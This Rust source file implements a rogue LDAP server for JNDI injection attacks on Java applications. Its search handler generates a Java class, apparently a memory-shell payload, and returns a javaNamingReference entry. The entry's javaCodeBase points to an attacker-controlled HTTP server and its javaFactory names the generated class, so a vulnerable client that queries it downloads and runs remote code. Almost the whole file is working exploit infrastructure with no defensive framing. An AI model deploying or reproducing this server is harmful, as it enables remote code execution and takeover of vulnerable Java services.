use tokio::net::{TcpListener, TcpStream};
// use tokio::stream::StreamExt;
use futures::SinkExt;
use futures::StreamExt;
use std::convert::TryFrom;
use std::net;
use std::str::FromStr;
use tokio_util::codec::{FramedRead, FramedWrite};
use crate::build_java;
use ldap3_proto::simple::*;
use ldap3_proto::LdapCodec;

pub struct LdapSession {
    dn: String,
    http_addr : String,
    http_port : u16,
}

impl LdapSession {
    pub fn do_bind(&mut self, sbr: &SimpleBindRequest) -> LdapMsg {
        if sbr.dn == "cn=Directory Manager" && sbr.pw == "password" {
            self.dn = sbr.dn.to_string();
            sbr.gen_success()
        } else if sbr.dn == "" && sbr.pw == "" {
            self.dn = "Anonymous".to_string();
            sbr.gen_success()
        } else {
            sbr.gen_invalid_cred()
        }
    }

    pub fn do_search(&mut self, lsr: &SearchRequest) -> Vec<LdapMsg> {
        info!("in do search {:?}", lsr);
        let mut base = lsr.base.to_string();
        base.remove(0);
        build_java::build_mm_class(&base, "127.0.0.1", "8888");
        info!("the base is {}", base);
        vec![
            lsr.gen_result_entry(LdapSearchResultEntry {
                dn: "cn=hello,dc=example,dc=com".to_string(),
                attributes: vec![
                    LdapPartialAttribute {
                        atype: "javaClassName".to_string(),
                        vals: vec!["TheClass".to_string()],
                    },
                    LdapPartialAttribute {
                        atype: "objectClass".to_string(),
                        vals: vec!["javaNamingReference".to_string()],
                    },
                    LdapPartialAttribute {
                        atype: "javaCodeBase".to_string(),
                        vals: vec![format!("http://{}:{}/", self.http_addr, self.http_port)],
                    },
                    LdapPartialAttribute {
                        atype: "javaFactory".to_string(),
                        vals: vec![base],
                    },
                ],
            }),
            lsr.gen_success(),
        ]
    }

    pub fn do_whoami(&mut self, wr: &WhoamiRequest) -> LdapMsg {
        wr.gen_success(format!("dn: {}", self.dn).as_str())
    }
}

async fn handle_client(socket: TcpStream, http_addr : String, http_port : u16) {
    info!("in handle client");
    // Configure the codec etc.
    let (r, w) = tokio::io::split(socket);
    let mut reqs = FramedRead::new(r, LdapCodec);
    let mut resp = FramedWrite::new(w, LdapCodec);

    let mut session = LdapSession {
        dn: "Anonymous".to_string(),
        http_addr,
        http_port
    };

    while let Some(msg) = reqs.next().await {
        debug!(?msg, "ldap message");
        let server_op = match msg
            .map_err(|_e| ())
            .and_then(|msg| ServerOps::try_from(msg))
        {
            Ok(v) => v,
            Err(_) => {
                let _err = resp
                    .send(DisconnectionNotice::gen(
                        LdapResultCode::Other,
                        "Internal Server Error",
                    ))
                    .await;
                let _err = resp.flush().await;
                return;
            }
        };

        let result = match server_op {
            ServerOps::SimpleBind(sbr) => vec![session.do_bind(&sbr)],
            ServerOps::Search(sr) => session.do_search(&sr),
            ServerOps::Unbind(_) => {
                // No need to notify on unbind (per rfc4511)
                return;
            }
            ServerOps::Whoami(wr) => vec![session.do_whoami(&wr)],
        };

        for rmsg in result.into_iter() {
            if let Err(_) = resp.send(rmsg).await {
                return;
            }
        }

        if let Err(_) = resp.flush().await {
            return;
        }
    }
    // Client disconnected
}

async fn acceptor(listener: Box<TcpListener>, http_addr : String, http_port : u16) {
    loop {
        match listener.accept().await {
            Ok((socket, _paddr)) => {
                tokio::spawn(handle_client(socket, http_addr.clone(), http_port));
            }
            Err(_e) => {
                //pass
            }
        }
    }
}

pub async fn start_ldap_server(ldap_port : u16, http_addr : String, http_port : u16){
    let addr = net::SocketAddr::from_str(&format!("0.0.0.0:{}", ldap_port)).unwrap();
    let listener = Box::new(TcpListener::bind(&addr).await.unwrap());

    // Initiate the acceptor task.
    tokio::spawn(acceptor(listener, http_addr, http_port));

    info!("started ldap://0.0.0.0:{} ...", ldap_port);
}


